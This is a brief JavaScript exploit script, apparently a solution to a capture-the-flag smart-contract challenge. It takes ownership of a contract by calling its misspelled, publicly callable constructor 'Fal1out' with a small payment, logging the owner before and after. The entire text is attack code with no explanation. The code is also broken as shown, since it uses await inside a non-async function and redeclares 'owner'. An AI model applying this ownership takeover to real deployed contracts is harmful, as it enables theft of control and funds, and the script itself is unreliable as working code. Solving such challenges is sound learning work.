function attack(){
let owner = await contract.owner();
console.log("owner is ",owner);
await contract.Fal1out({value:10});
let owner = await contract.owner();
console.log("owner is ",owner);

}

attack();
